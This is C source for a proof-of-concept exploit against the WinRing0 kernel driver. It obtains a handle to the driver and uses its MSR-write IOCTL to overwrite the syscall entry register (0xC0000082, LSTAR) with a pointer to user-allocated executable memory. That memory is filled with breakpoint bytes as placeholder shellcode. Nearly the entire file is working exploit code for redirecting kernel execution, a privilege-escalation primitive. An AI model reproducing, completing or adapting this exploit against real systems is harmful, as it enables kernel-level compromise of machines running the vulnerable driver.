#include "poc.h"

int main(int argc, char** argv)
{
	// Register: 0xC0000082
	// Value: pointer to shellcode

	char unused = 0, output[4096], * shellcode_alloc = 0, syscall[2] = { 0x0F, 0x05 };
	HANDLE h_driver = (HANDLE)-1;
	OLS_WRITE_MSR_INPUT input;
	unsigned long bytes_returned = 0, old_protection = 0;

	RtlSecureZeroMemory(&input, sizeof(input));
	RtlSecureZeroMemory(&output, sizeof(output));

	system("title poc | color f");

	printf("[!] WinRing0 Proof-of-Concept Exploit\n[!] Written by ExAllocatePool2.\n[!] Lets exploit!\n[*] Racing to obtain a driver handle...");

	while (h_driver == (HANDLE)-1)
	{
		h_driver = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	}
	printf("\n[+] Obtained a driver handle. Handle Value: 0x%p", h_driver);

	if (!VirtualProtect(&syscall, sizeof(syscall), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the syscall instruction buffer as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the syscall instruction buffer as read+write+executable. New Protection: %d (0x%x), Old Protection: %d (0x%x)", PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READWRITE, old_protection, old_protection);

	shellcode_alloc = VirtualAlloc(0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!shellcode_alloc)
	{
		printf("\n[-] Failed to allocate shellcode stack memory. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated shellcode stack memory. Shellcode Stack Address: 0x%p", shellcode_alloc);

	memset(shellcode_alloc, 0xCC, 4096);
	printf("\n[+] Mapped the shellcode onto the allocated stack memory.");

	input.Register = 0xC0000082;
	input.Value.QuadPart = (ULONGLONG)((PULONGLONG)shellcode_alloc);
	printf("\n[+] Initialized input structure.");

	printf("\n");
	system("pause");
	DeviceIoControl(h_driver, IOCTL_WRITE_MSR, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Wrote %lld (0x%p) to register %lu (0x%p).", input.Value.QuadPart, (PULONGLONG)input.Value.QuadPart, input.Register, (PULONGLONG)input.Register);

	unused = getchar();

	return 0;
}